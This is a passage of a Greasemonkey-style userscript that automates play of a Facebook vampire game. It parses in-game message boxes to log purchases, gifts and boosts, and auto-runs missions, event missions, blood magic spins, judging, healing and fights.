		var boxes = document.getElementById('content').getElementsByTagName('span');
		if(boxes.length==0)
			return;
		
		// Debugging Tool - Show all boxes
		var showAllBoxesDebug = false;
		if(showAllBoxesDebug) {
			var debugAllBoxesBox = makeElement('div', document.body);
				debugAllBoxesBox.id = 'debugAllBoxesBox';
					debugAllBoxesBox.setAttribute("style", "position: absolute; left: 815px; top: 200px;  width: 400px; height: 400px; background: black url(http://facebook6.vampires.static.zynga.com/31993/css/ui/border_deco_fb.jpg); font-family: Verdana; font-size: 8pt; color: #FFFFFF; text-align: left; padding: 5px; border: 1px dotted; visibility: visible; z-index: 999999;");
					debugAllBoxesBox.innerHTML = "Debug Tool - Display All Message Boxes<br>Number of Boxes = " + boxes.length + "<br>";
					if(boxes.length>25) {
						debugAllBoxesBox.innerHTML = debugAllBoxesBox.innerHTML + "(Too many boxes to display all - displaying first 25 only)<br>";
						for (var i=0;i<25;i++){
							debugAllBoxesBox.innerHTML = debugAllBoxesBox.innerHTML + "Box " + i + ":<br>";
							debugAllBoxesBox.innerHTML = debugAllBoxesBox.innerHTML + boxes[i].innerHTML + "<br>";
						}
					} else {



						for (var i=0;i<boxes.length;i++){
							debugAllBoxesBox.innerHTML = debugAllBoxesBox.innerHTML + "Box " + i + ":<br>";
							debugAllBoxesBox.innerHTML = debugAllBoxesBox.innerHTML + boxes[i].innerHTML + "<br>";
						}
					}
		}
		

		for (var i=0;i<boxes.length;i++){
			if(boxes[i].innerHTML.indexOf('To complete this mission you need')!= -1){
				var itemMission2 = parseInt(boxes[i].innerHTML.split('focus" value="')[1].split('"')[0]);
				if(GM_getValue('itemMission', 1)<0){
					//alert("focus="+ (itemMission2-1));
					GM_setValue('itemMission', itemMission2-1);
				}
				return;
			}
		}

		if (GM_getValue('autoLog', '') != "checked")
			return;

		for (var i=0;i<boxes.length;i++){
			if(boxes[i].innerHTML.indexOf('You just bought')!= -1){
				log("BUY "+boxes[i].innerHTML);	
				var item = boxes[i].innerHTML.split('You just bought')[1].split('for')[0];
				addToLog("You just bought " + item);
			}
		}

		for (var i=0;i<boxes.length;i++){
			if(boxes[i].innerHTML.indexOf('You successfully dominated')!= -1){
				var minion = boxes[i].innerHTML.split('You successfully dominated ')[1];
				minion = minion.split('. <a href')[0];
				if (isGMChecked('logMinionPurch')) addToLog("You successfully dominated " + minion);
			}
		}

		for (var i=0;i<boxes.length;i++){
			if(boxes[i].innerHTML.indexOf('You withdrew')!= -1){
				log("WITHDREW "+boxes[i].innerHTML);	
				var deposit = boxes[i].innerHTML.split('blood.gif">')[1];
				addToLog("withdrew " + deposit.toInt());
			}
		}

		for (var i=0;i<boxes.length;i++){
			if(boxes[i].innerHTML.indexOf('deposited and stored safely')!= -1){
				log("DEPOSIT "+boxes[i].innerHTML);	
				var deposit = boxes[i].innerHTML.split('blood.gif">')[1];
				addToLog("deposit " + deposit.toInt());
			}
		}

		for (var i=0;i<boxes.length;i++){
			if(boxes[i].innerHTML.indexOf('more health')!= -1){
				var addHealth = boxes[i].innerHTML.split('You got')[1].split('more health')[0];
				var cost = 0;
				if(boxes[i].innerHTML.indexOf('blood.gif">') != -1)
					cost = boxes[i].innerHTML.split('blood.gif">')[1];
				addToLog("health +"+ addHealth + " for " + cost.toInt());
			}
		}

		for (var i=0;i<boxes.length;i++){
			if(boxes[i].innerHTML.indexOf('The Wheel and fate has smiled upon you')!= -1){
				addToLog(boxes[i].innerHTML.split('smiled upon you.<br>')[1].split('Repay the favor')[0]);
			}
		}

		for (var i=0;i<boxes.length;i++){
			if(boxes[i].innerHTML.indexOf('hours and')!= -1){

				log("CRYPT "+boxes[i].innerHTML);	

				//// index page shows crypt timer
				//if (location.href.indexOf('/index') != -1){
				//	// do nothing for now
				//}
			}
		}

		for (var i=0;i<boxes.length;i++){
			if(boxes[i].innerHTML.indexOf(' hours, ')!= -1){

				log("CRYPT "+boxes[i].innerHTML);	

				//// index page shows crypt timer
				//if (location.href.indexOf('/index') != -1){
				//	// do nothing for now
				//}
				// buffs page shows buff timer
			}
		}

		for (var i=0;i<boxes.length;i++){
			if(boxes[i].innerHTML.indexOf(' minutes, ')!= -1){

				log("CRYPT "+boxes[i].innerHTML);	

				//// index page shows crypt timer
				//if (location.href.indexOf('/index') != -1){
				//	// do nothing for now
				//}
				// buffs page shows buff timer
			}
		}

		for (var i=0;i<boxes.length;i++){
			if(boxes[i].innerHTML.indexOf('received your gift')!= -1){
				addToLog(boxes[i].innerHTML.split('<br>')[1]);
			}
		}

		for (var i=0;i<boxes.length;i++){
			if(boxes[i].innerHTML.indexOf('You gave')!= -1){
				addToLog('You gave ' + boxes[i].innerHTML.split('You gave')[1].split('<')[0]);
			}
		}

//		for (var i=0;i<boxes.length;i++){
//			if(boxes[i].innerHTML.indexOf('delete all news')!= -1){
//				//delete all news
//			}
//		}

		for (var i=0;i<boxes.length;i++){
			if(boxes[i].innerHTML.indexOf('To complete this mission you need:')!= -1){
				GM_setValue('autoMission',0);
				addToLog('Unable to continue auto-Mission, missing a required item.');
				setTimeout("document.location ='" + "http://apps.facebook.com/"+SCRIPT.name+"/index.php'", delay);
			}
		}

// Collect number of boosts from Stats page for display in Quick Links box:
		for (var i=0;i<boxes.length;i++){
			if(boxes[i].innerHTML.indexOf('You used a')!= -1){
				addToLog('You used a' + boxes[i].innerHTML.split('You used a')[1].split('<')[0]);
				if(boxes[i].innerHTML.indexOf('You used a 50% Rage Boost') != -1){
					GM_setValue('numRageBoosts',GM_getValue('numRageBoosts', 0)-1);
				}
				if(boxes[i].innerHTML.indexOf('You used a 50% Energy Boost') != -1){
					GM_setValue('numFiftyNrgBoosts',GM_getValue('numFiftyNrgBoosts', 0)-1);
					if((GM_getValue('numFiftyNrgBoosts', 0) < 10) && GM_getValue('tooManyNRGBoosts',false)  && (GM_getValue('autoCollectorPause') == "checked")) {
						 GM_setValue('autoCollectorPause', '');
						 addToLog('Unpausing Auto-Collector');
					}
				}
				if(boxes[i].innerHTML.indexOf('You used a 50% Health Boost') != -1){
					GM_setValue('numHealthBoosts',GM_getValue('numHealthBoosts', 0)-1);
				}
				if(boxes[i].innerHTML.indexOf('You used a 100% Energy Boost') != -1){
					GM_setValue('numHundredNrgBoosts',GM_getValue('numHundredNrgBoosts', 0)-1);
				}
				refreshQuickLinksBox();
			}
		}

// Fixed logging of "cannot fight a member of your Clan" message
		for (var i=0;i<boxes.length;i++){
			if(boxes[i].innerHTML.indexOf('You cannot fight a member of your Clan')!= -1){
				log("FIGHT CLAN "+boxes[i].innerHTML);	
				addToLog("You cannot fight a member of your Clan");
				CycleFightList();
				//if(GM_getValue('rFightList', '') == "checked"){
				//	var opponents = GM_getValue('fightList', '').split("\n");
				//	var opponentList="";
				//	for (var i=1;i<opponents.length;i++)
				//		opponentList = opponentList+ opponents[i]+"\n";
				//	GM_setValue('fightList', opponentList);
				//}
			}
		}

// Log receiving items in various ways
		for (var i=0;i<boxes.length;i++){
			if(boxes[i].innerHTML.indexOf('You have received')!= -1){
				addToLog("You have received "+ boxes[i].innerHTML.split('You have received ')[1].split('</td>')[0]);
				if(boxes[i].innerHTML.indexOf('You have received 1 50% Rage Boost') != -1){
					GM_setValue('numRageBoosts',GM_getValue('numRageBoosts', 0)+1);
				}
				if(boxes[i].innerHTML.indexOf('You have received 1 50% Energy Boost') != -1){
					GM_setValue('numFiftyNrgBoosts',GM_getValue('numFiftyNrgBoosts', 0)+1);
				}
				if(boxes[i].innerHTML.indexOf('You have received 1 50% Health Boost') != -1){
					GM_setValue('numHealthBoosts',GM_getValue('numHealthBoosts', 0)+1);
				}
				if(boxes[i].innerHTML.indexOf('You have received 1 100% Energy Boost') != -1){
					GM_setValue('numHundredNrgBoosts',GM_getValue('numHundredNrgBoosts', 0)+1);
				}
			}
			if(boxes[i].innerHTML.indexOf('You received')!= -1){
				addToLog("You received "+ boxes[i].innerHTML.split('You received ')[1].split('</td>')[0]);
				setGMTime('activeMagicTimer', '00:20');
			}
		}

// Judging
		for (var i=0;i<boxes.length;i++){
			if(boxes[i].innerHTML.indexOf('You just judged')!= -1){
				if(boxes[i].innerHTML.indexOf(', and')!= -1){
					GM_setValue('statsJudges',GM_getValue('statsJudges', 0)+3);
				} else {
					GM_setValue('statsJudges',GM_getValue('statsJudges', 0)+1);
				}
				refreshStatsBox();
			}
		}

// Gifting
		for (var i=0;i<boxes.length;i++){
			if((boxes[i].innerHTML.indexOf('You gave')!= -1) && (boxes[i].innerHTML.indexOf('doAgainLink')!= -1)){
				GM_setValue('statsGiftsGiven',GM_getValue('statsGiftsGiven', 0)+1);
				refreshStatsBox();
			}
		}

// Log receiving items in various ways
		// Receiving gifts...
		for (var i=0;i<boxes.length;i++){
			if(boxes[i].innerHTML.indexOf(' has sent you ')!= -1){
				addToLog(boxes[i].innerHTML.split('<td>')[2].split('</td>')[0]);
			}
		}

// logging of Blood Magic Spin results
		for (var i=0;i<boxes.length;i++){
			if(boxes[i].innerHTML.indexOf('Mandy has given you')!= -1){
				addToLog("Mandy has given you "+ boxes[i].innerHTML.split('Mandy has given you ')[1].split('<br>')[0]);
			}
		}

// Midas Touch
		for (var i=0;i<boxes.length;i++){
			if(boxes[i].innerHTML.indexOf('The collector awarded you Midas Touch')!= -1){
				addToLog(boxes[i].innerHTML);
			}
		}

// Detecting "..10 or more boosts in your inventory..." message
		GM_setValue('tooManyNRGBoosts',false);
		for (var i=0;i<boxes.length;i++){
			if(boxes[i].innerHTML.indexOf('You cannot gain more energy boosts')!= -1){
				GM_setValue('tooManyNRGBoosts',true);
			}
		}

//--------------------------------------------------------
// Messages that require action
//--------------------------------------------------------

		for (var i=0;i<boxes.length;i++){
//			if(boxes[i].innerHTML.indexOf('Patience, nosferatu. You cannot heal so fast!')!= -1){
			if(boxes[i].innerHTML.indexOf('You cannot heal so fast')!= -1){
				if(GM_getValue('autoBoostHealth', '') == "checked" && health < GM_getValue('autoBoostHealthMin', 0) && GM_getValue('numHealthBoosts', 0) > GM_getValue('autoBoostHealthKeep', 0)){
					if (GM_getValue('autoLog', '') == "checked") {
						if (isGMChecked('logHealEvents')) addToLog("Detected attempt to heal too fast. Using a Health Boost. Health = "+ health );
					}
//					setTimeout("document.location = '"+"http://apps.facebook.com/"+SCRIPT.name+"/stats.php?useBoostCons=252'", delay);

					// Get the boost Link.
					elt = xpathFirst('.//div[@id="quickLinksBox"]//a[contains(@href,"stats.php?useBoostCons=252")]');
					if (!elt) {
					    log('Can\'t find Health Boost link to click. ');
					    return true;
					}

					// Use the boost!
					Autoplay.fx = function() {
					    clickAction = 'health_boost';
					    clickElement(elt);
					    log('Using Health Boost');
					};
					Autoplay.delay = delay;
					Autoplay.start();

					return;
				} else {	
					if (GM_getValue('autoLog', '') == "checked") {
						if (isGMChecked('logHealEvents')) addToLog("Detected attempt to heal too fast. Auto-heal at health: "+ health );
					}
					document.getElementById('health_refill_popup').style.display = 'block';
					setTimeout(function(){document.getElementById('health_refill_popup').getElementsByTagName('form')[0].submit();},delay);
					return;
				}
			}
		}

		for (var i=0;i<boxes.length;i++){
			if(boxes[i].innerHTML.indexOf('The wheel halts suddenly')!= -1){
				log("WHEEL "+boxes[i].innerHTML);	
				addToLog(boxes[i].innerHTML.split('<br>')[1]);
				setTimeout("document.location ='" + "http://apps.facebook.com/"+SCRIPT.name+"/buffs.php'", delay);
				return;		
			}
		}

		for (var i=0;i<boxes.length;i++){
			if(boxes[i].innerHTML.indexOf('Someone has invited you to join their Clan')!= -1){
				if((GM_getValue('autoClan', '') == "checked") && (GM_getValue('paused') == 0))
				{
					window.location = "http://apps.facebook.com/"+SCRIPT.name+"/recruit.php";
					return;
				}
			}
		}

		var missioncompleted = document.evaluate("//div[@class='mission_success']", document, null, XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE, null);
		var missionmastery = document.evaluate("//div[@class='mission_masterybar']", document, null, XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE, null);
		if (missioncompleted.snapshotLength > 0) {
			missionName = missioncompleted.snapshotItem(0).innerHTML.substring((missioncompleted.snapshotItem(0).innerHTML.indexOf('You successfully completed: ')+28),missioncompleted.snapshotItem(0).innerHTML.indexOf('!'));
			if (missionmastery.snapshotLength > 0) {
				masterLevel = missionmastery.snapshotItem(0).innerHTML.substring(missionmastery.snapshotItem(0).innerHTML.indexOf('Level'),missionmastery.snapshotItem(0).innerHTML.indexOf('%'))+'%';
				missionName = missionName + ' - ' + masterLevel;
			}

			var missionresults = document.evaluate("//div[@class='mission_infocont']", document, null, XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE, null);

			if(missionresults.snapshotItem(0).innerHTML.split('icon-experience.gif">')[1].split(' exp points')[0].indexOf('<del>') != -1)
				var missionExpGainedA =  missionresults.snapshotItem(0).innerHTML.split('icon-experience.gif">')[2].split(' exp points')[0].toInt();
			else
				var missionExpGainedA =  missionresults.snapshotItem(0).innerHTML.split('icon-experience.gif">')[1].split(' exp points')[0].toInt();
			
			var missionEnergySpentA =  missionresults.snapshotItem(0).innerHTML.split('icon-energy.gif">')[1].split(' energy')[0].toInt();


			GM_setValue('statsMissions',GM_getValue('statsMissions', 0)+1);
			GM_setValue('missionExpGained',GM_getValue('missionExpGained', 0)+missionExpGainedA);
			GM_setValue('missionEnergySpent',GM_getValue('missionEnergySpent', 0)+missionEnergySpentA);
			refreshStatsBox();
			if (isGMChecked('logMissionExecution')) addToLog('Mission Completed: '+missionName);
		}
		//else
			//alert(messagebox.innerHTML);

	}
	catch(e){}

// Log the spoils from Akem's Gamble
	try{
//		var akemsResult = document.evaluate("//td[@class='lotto_flavor']",document,null,9,null).singleNodeValue;
		var akemsResult = document.evaluate("//div[@class='itemInfo']",document,null,9,null).singleNodeValue;

		if(akemsResult.innerHTML.length==0)
			return;

//		alert('akemsResult='+akemsResult.innerHTML);

		if(akemsResult!=null && akemsResult.innerHTML.indexOf('The chest creaks open at your touch') != -1){
//			var akemsItemWon = document.evaluate("//div[@class='wonItem']",document,null,9,null).singleNodeValue.innerHTML;
//			addToLog("Free Gamble Result: " +akemsItemWon);

			var akemsItemWonFullItemList = akemsResult.innerHTML;	
//			alert('akemsItemWonFullItemList='+akemsItemWonFullItemList);
			addToLog("Free Gamble Result: " +akemsItemWonFullItemList);
		}
	}
	catch(e){
//		if (location.href.indexOf('/lottery.php') != -1){
//			log('Error during Logging Akems Gamble: ' + e);
//			addToLog('Error during Logging Akems Gamble: ' + e);
//		}
	}

}

function handlePages(){
	log('Autoplayer handlePages');
	var menu = document.evaluate("//li[@class='us_tabs'] | //li[@class='selected_tab']", document, null, XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE, null);
 	var submenu = document.evaluate("//div[@class='subWrapLeft_active'] | //div[@class='subWrapLeft_inactive']", document, null, XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE, null);
	if(menu==null){
		log("ERROR: Unable to find main menu tabs!");
		return false;
	}
	if(submenu==null){
		log("ERROR: Unable to find submenu tabs!");
		return false;
	}
	if(submenu.snapshotLength == 0){
		if (location.href.indexOf('/gift.php') != -1) {
			// Gift page doesn't need processing
			return true;
		}
		log("ERROR: Zero submenu tabs found!");
		log("Looking for send_gifts.php links in main menu tabs...");
		// Look for send_gifts.php links in main menu tabs.
		for (tmp = 1; tmp < menu.snapshotLength; tmp++)
		{
			elt = xpathFirst('.//a[contains(@href,"send_gifts.php?skipLink=")]', menu.snapshotItem(tmp));
			if (elt) break;
		}

		if (!elt) {
		    log('Can\'t find send_gifts.php links in main menu tabs. ');
		    return false;
		}

		// Go to the Event Waypoint (Home).
		Autoplay.fx = function() {
		    clickAction = 'click_send_gift_link';
		    clickElement(elt);
		    log('Found send_gift.php link in main menu tabs - clicking it.');
		};
		Autoplay.start();
	}

	for (var index = 0 ; index < menu.snapshotLength; index++)
		if( menu.snapshotItem(index).getAttribute('class') == "selected_tab")
			break;
	for (var subindex = 0 ; subindex < submenu.snapshotLength; subindex++)
		if( submenu.snapshotItem(subindex).getAttribute('class') == "subWrapLeft_active")
			break;

// Automate Special Events
// Used for events with two sets of Job screens.
	if (eventActive && location.href.indexOf('/eventjobs.php') != -1){
		//alert("submenu.snapshotItem(0).parentNode.getAttribute('title') = '"+submenu.snapshotItem(0).parentNode.getAttribute('title')+"'");
		//alert("menuItems[9][0][0] = '"+menuItems[9][0][0]+"'");
		if (submenu.snapshotItem(0).parentNode.getAttribute('title').indexOf(menuItems[10][0][0])!= -1){
			index = 10;
		} else {
			index = 9;
		}
		//alert("index = '"+index+"'");
	}

//	if(index==1 && submenu.snapshotLength==2)
	if ((index==1) && (submenu.snapshotItem(0).parentNode.getElementsByTagName('a')[0].innerHTML.indexOf(menuItems[8][0][0])!= -1) && (submenu.snapshotItem(1).parentNode.getElementsByTagName('a')[0].innerHTML.indexOf(menuItems[8][1][0])!= -1))
		index = 8;

	//log("index = '"+index+"'  subindex = '"+subindex+"'");
	log("found selected tab " + menuItems[index][subindex][0]);
	
	// now we know on what page we are...  trigger a function accoringly
	if( menuItems[index][subindex][1]!=null){
		window.setTimeout(menuItems[index][subindex][1], 500);
		return true;
	}
	return false;
}

function DoBloodMagic(){
	if(GM_getValue('autoBloodMagic', '') != "checked" || GM_getValue('paused')!=0 )
		return;
	var now = Math.floor(new Date().getTime() / 1000);
	if (now > GM_getValue('spin',0)){
		log('Autoplayer Blood Magic');
		var time = document.evaluate("//span[@class='treasure_timer']",document,null,9,null).singleNodeValue;
		if(time==null) {
			// time ran out... do the buff
//			window.location = "http://apps.facebook.com/"+SCRIPT.name+"/buffs.php?doBuff=1";

			elt = xpathFirst('.//div[@id="blood_button_active"]//a[contains(@href,"buffs.php?doBuff=1")]', innerPageElt);
			if (!elt) {
			    log('Can\'t find spin link to click. ');
			    return true;
			}

			// Spin!
			Autoplay.fx = function() {
			    clickAction = 'free_mandy_spin';
			    clickElement(elt);
			    log('Spinning for Blood Magic');
			};
			Autoplay.delay = delay;
			Autoplay.start();
		} else {
			GM_setValue('spin',now + 3600 * parseInt(time.innerHTML.split('hours')[0])+  60 *(1+ parseInt(time.innerHTML.split('hours and')[1])));
			return;
		}
	}
}

function JudgePeople(){
	if(GM_getValue('autoJudge', '') != "checked" | GM_getValue('paused')!=0 | GM_getValue('JudgeCount', 0)<1)
		return;
	log('JudgePeople');
	
	var judgeList = document.evaluate("//div[@class='judge1']",document,null,XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE,null);
	for (var index = 0 ; index < judgeList.snapshotLength ; index++){
		document.getElementById('vote'+index +'_'+ (1+GM_getValue('JudgeRating', 1))).checked ="checked";
		document.getElementById('comment_textarea'+index).innerHTML = GM_getValue('JudgeComment', "no comment");
	}
	GM_setValue('JudgeCount',GM_getValue('JudgeCount', 0)-1);
	setTimeout(function(){document.getElementById('comment_submit').click();},delay);
}

function DoMissions(){
	if (location.href.indexOf("/jobs.php") != -1){
		UpdateJobsPage();
	}

	var jobs = document.evaluate("//tr[@class='darkRow'] | //tr[@class='lightRow'] | //tr[@class=''] | //tr[@class='aJob']", document, null, XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE, null);
	
	if(GM_getValue('autoMission', '') != "checked" || GM_getValue('paused')!=0)
		return;
	if (GM_getValue('itemMission')==undefined) GM_setValue('itemMission', -1);


	// This section executes a mission to collect required mission items
	var missionOnPage = GM_getValue('itemMission', 0);
	//alert("missionOnPage="+missionOnPage);
// Blannie Orig:
//	if(missionOnPage>0 && energy>missions[missionOnPage][1])
// Added Exp Reserve
	if(missionOnPage>0 && energy>(missions[missionOnPage][1]+parseInt(GM_getValue('missionExpReserve', 0))))
	{
		log("energy "+energy +" itemMission "+missionOnPage+"="+missions[missionOnPage][0]);
		if (location.href.indexOf(SCRIPT.name+"/jobs.php?") == -1 && location.href.indexOf("currentTier="+missions[missionOnPage][2]) == -1){
			window.location = "http://apps.facebook.com/"+SCRIPT.name+"/jobs.php?currentTier="+missions[missionOnPage][2];
			return;
		}
		log('Autoplayer autoMission '+missionOnPage+ " "+ energy);
		log('Executing mission '+missions[missionOnPage][3]+' on this tab to collect a mission item.');
		var sform =jobs.snapshotItem(missions[missionOnPage][3]).getElementsByTagName('a');
		sform = sform[sform.length-1];

		// Get the Mission Link.
		elt = xpathFirst('.//a[contains(@href,"action=doJob&currentTier='+missions[missionOnPage][2]+'&job='+missions[missionOnPage][4]+'")]', jobs.snapshotItem(missions[missionOnPage][3]));
		if (!elt) {
		    log('Can\'t find mission link to click. ');
		    return true;
		}

		// Run the mission!
		Autoplay.fx = function() {
		    clickAction = 'mission';
		    clickElement(elt);
		    log('Executing Mission');
		};
		Autoplay.delay = delay;
		Autoplay.start();


		GM_setValue('itemMission', -1);
		return;
	}


	// This section executes normal missions
	var missionOnPage = GM_getValue('selectMission', 0);
	//alert("missionOnPage="+missionOnPage+"...missionExpReserve="+parseInt(GM_getValue('missionExpReserve', 0)));
// Blannie Orig:
//	if(energy<missions[missionOnPage][1])
// Added Exp Reserve
	if(energy<(missions[missionOnPage][1]+parseInt(GM_getValue('missionExpReserve', 0))))
		return;	
	log('selectMission '+missionOnPage+'=' +missions[missionOnPage][0]);
	if (location.href.indexOf(SCRIPT.name+"/jobs.php?") == -1 && location.href.indexOf("currentTier="+missions[missionOnPage][2]) == -1){
		window.location = "http://apps.facebook.com/"+SCRIPT.name+"/jobs.php?currentTier="+missions[missionOnPage][2];
		return;
	}
	log('Executing mission '+missions[missionOnPage][3]+' on this tab.');

	var sform =jobs.snapshotItem(missions[missionOnPage][3]).getElementsByTagName('a');
	sform = sform[sform.length-1];
	
	if(GM_getValue('missionMastery', '') == "checked"){
		log('autoMission missionMastery');
	
		var masteryList = document.evaluate("//td[@class='job_desc']",document,null,XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE,null);
		if(masteryList.snapshotItem(missions[missionOnPage][3]).innerHTML.indexOf('Mission Mastered') != -1){
			if( parseInt(missionOnPage)+1 <  missions.length)
				GM_setValue('selectMission', missionOnPage+1 % missions.length);
			else
				GM_setValue('missionMastery', '');

			window.location = "http://apps.facebook.com/"+SCRIPT.name+"/jobs.php?currentTier="+missions[missionOnPage][2];
			return;
		}
	}
	// Either Mission Mastery is not checked, or it is checked and the mission to execute is not mastered

	// Get the Mission Link.
	elt = xpathFirst('.//a[contains(@href,"action=doJob&currentTier='+missions[missionOnPage][2]+'&job='+missions[missionOnPage][4]+'")]', jobs.snapshotItem(missions[missionOnPage][3]));
	if (!elt) {
	    log('Can\'t find mission link to click. ');
	    return true;
	}

	// Run the mission!
	Autoplay.fx = function() {
	    clickAction = 'mission';
	    clickElement(elt);
	    log('Executing Mission');
	};
	Autoplay.delay = delay;
	Autoplay.start();

	return;
}


// Automate Special Events
function DoEventMissions(){
	if (location.href.indexOf("/"+eventJobsPage) != -1){
		UpdateJobsPage();
	}
	var jobs = document.evaluate("//tr[@class='darkRow'] | //tr[@class='lightRow'] | //tr[@class=''] | //tr[@class='aJob']", document, null, XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE, null);
	
	if(GM_getValue('autoEventMission', '') != "checked" || GM_getValue('paused')!=0)
		return;
	if (GM_getValue('itemMission')==undefined) GM_setValue('itemMission', -1);

	// Check to see if Event Stage is completed, and if so, whether the user wants to reset the Event Stage:
	if(document.body.innerHTML.indexOf('Reset Mission Mastery') != -1) {
		//alert('Detected Event Stage Completed');
		if(GM_getValue('autoEventReset','') == 'checked') {
			log('Resetting Event Stage');
			addToLog('Resetting Event Stage');
			// Also start at the first mission in the stage:
			if(GM_getValue('eventMasterOne', '') == "checked") {
				for (var i = 0, iLength=eventMissions.length; i < iLength; ++i) {
					if(eventMissions[i][2] == GM_getValue('selectEventMissionO', '')) {
				    		GM_setValue('selectEventMissionA', i-1);
				    		break;
				    	}
				}
			}

			window.location = "http://apps.facebook.com/"+SCRIPT.name+"/"+eventResetPage+GM_getValue('selectEventMissionO','');
		}
	}


	var missionOnPage = GM_getValue('selectEventMissionA', 0);
	//alert("missionOnPage="+missionOnPage+"...missionExpReserve="+parseInt(GM_getValue('missionExpReserve', 0)));
// Blannie Orig:
//	if(energy<missions[missionOnPage][1])
// Added Exp Reserve
	if(energy<(eventMissions[missionOnPage][1]+parseInt(GM_getValue('missionExpReserve', 0))))
		return;	
	log('selectEventMissionA '+missionOnPage+'=' +eventMissions[missionOnPage][0]);
//	if (location.href.indexOf("/"+eventJobsPage+"?currentTier="+eventMissions[missionOnPage][2]) == -1){
	if ((location.href.indexOf("/"+eventJobsPage) == -1) || (location.href.indexOf("currentTier="+eventMissions[missionOnPage][2]) == -1)){
		window.location = "http://apps.facebook.com/"+SCRIPT.name+"/"+eventJobsPage+"?currentTier="+eventMissions[missionOnPage][2];
		return;
	}
	var sform =jobs.snapshotItem(eventMissions[missionOnPage][3]).getElementsByTagName('a');
	sform = sform[sform.length-1];
	log('Executing Event mission '+eventMissions[missionOnPage][3]+' on this tab.');

////	if(GM_getValue('missionMastery', '') == "checked"){
//		log('Event autoMission missionMastery (assumed)');
	
	if(GM_getValue('eventMissionRepeat', '') != "checked"){
		var masteryList = document.evaluate("//td[@class='job_desc']",document,null,XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE,null);
		if(masteryList.snapshotItem(eventMissions[missionOnPage][3]).innerHTML.indexOf('Mission Mastered') != -1){
			if( GM_getValue('eventMasterAll','') == 'checked'){
				if( parseInt(missionOnPage)+1 <  eventMissions.length)
					GM_setValue('selectEventMissionA', missionOnPage+1 % eventMissions.length);
				else
					GM_setValue('autoEventMission', '');

				window.location = "http://apps.facebook.com/"+SCRIPT.name+"/"+eventJobsPage+"?currentTier="+eventMissions[missionOnPage][2];
				return;
			} else {
				if( parseInt(missionOnPage)+1 >= eventMissions.length){
					GM_setValue('autoEventMission', '');
					return;
				}

				if( eventMissions[parseInt(missionOnPage)+1][2] == GM_getValue('selectEventMissionO','')) {
					GM_setValue('selectEventMissionA', missionOnPage+1 % eventMissions.length);
				} else {
					for (var i = 0, iLength=eventMissions.length; i < iLength; ++i) {
						if(eventMissions[i][2] == GM_getValue('selectEventMissionO', '')) {
							GM_setValue('selectEventMissionA', i);
							break;
						}
					}
				}
			}
		}
	} else {
		log('Event autoMission Repeat Mission');
	}

//	setTimeout("document.location = '"+sform.href+"'", delay);

	// Get the Mission Link.
	elt = xpathFirst('.//a[contains(@href,"action=doJob&currentTier='+eventMissions[missionOnPage][2]+'&job='+eventMissions[missionOnPage][4]+'")]', jobs.snapshotItem(eventMissions[missionOnPage][3]));
	if (!elt) {
	    log('Can\'t find event mission link to click. ');
	    return true;
	}

	// Run the mission!
	Autoplay.fx = function() {
	    clickAction = 'event_mission';
	    clickElement(elt);
	    log('Executing Event Mission');
	};
	Autoplay.delay = delay;
	Autoplay.start();

	return;
}


function DoFights(){

	if(GM_getValue('autoFight', '') != "checked" || rage <= GM_getValue('fightKeepRage', 0) || (GM_getValue('autoHeal', '') == "checked" && health < GM_getValue('healthLevel', 0)) || (GM_getValue('paused')!=0))
	{
		log('Auto-Fight: ' + GM_getValue('autoFight', ''));	
		log('Fight Keep Rage: ' + GM_getValue('fightKeepRage', 0) + ' of ' + rage);
		log('Paused: ' + GM_getValue('paused'));
		return;
	}

	log('Autoplayer autoFight ' + rage);	
	if(health>19){
		// log('Autoplayer Health: ' + health);	
		if(GM_getValue('fightRandom', '') == "checked"){
	    		// log('Fighting mode: Random');	

			// Adds fight looping code from Mafia Wars script to gather all valid targets on fight screen.  Also adds additional parameters.
			// Fight Opponent Finder Loop Code from Mafia Wars script
			if (location.href.indexOf('/fight.php') != -1)
			{
				var opponents  = document.evaluate("//div[@class='fight_table_container']//input[@name='opponent_id']",document,null,XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE,null);//.singleNodeValue;
				// (Loop code borrowed from StevenD's Mafia Wars script - Thanks Liquidor for the loop code)

				// Calculate my target level range
				var opponentLevelMax = parseInt(GM_getValue('fightLevel', 100));
				var opponentLevelMin = parseInt(GM_getValue('fightMinLevel', 0));
				// Make any relative adjustments (if enabled).
				if (GM_getValue('fightLevelRelative', false) == "checked") {
				  opponentLevelMax = opponentLevelMax + level;
				  opponentLevelMin = level - opponentLevelMin;
				}

				// Calculate my target SR range
				var opponentSRTargetMax = parseInt(GM_getValue('fightClanMaxRating', 8000));
				var opponentSRTargetMin = parseInt(GM_getValue('fightClanRating', 0));

				// Make any relative adjustments (if enabled).
				if (GM_getValue('fightRatingRelative', false) == "checked") {
				  opponentSRTargetMax = opponentSRTargetMax + parseInt(GM_getValue('mySkillRanking',0));
				  opponentSRTargetMin = parseInt(GM_getValue('mySkillRanking',0)) - opponentSRTargetMin;
				}

				log('Auto-Fight: Found ' + opponents.snapshotLength + ' opponents on page');	

				var validOpponents = [];
				for (tmp = 1; tmp < opponents.snapshotLength; tmp++)
				{
					var fightNode =opponents.snapshotItem(tmp).parentNode.parentNode.parentNode; 
					var opponentLevel =  parseInt(fightNode.innerHTML.split('Level ')[1]);
					var opponentRating = fightNode.innerHTML.split('groupsize">')[1].split('</td>')[0];
					opponentRating = opponentRating.replace(/,/g, '');
					opponentRating = parseInt(opponentRating);
					var opponentId = opponents.snapshotItem(tmp).value;
					var opponentClan = parseInt(fightNode.innerHTML.split('groupsize">')[2]);
					var userurl = fightNode.getElementsByTagName('a')[0];
					var username = userurl.innerHTML;

					/*
					if(tmp==1) {
						alert('opponentLevel='+opponentLevel+'\
						opponentRating='+opponentRating+'\
						userurl='+userurl+'\
						opponentId='+opponentId+'\
						opponentClan='+opponentClan+'\
						username='+username);
					}
					*/

					// Collect Good Targets
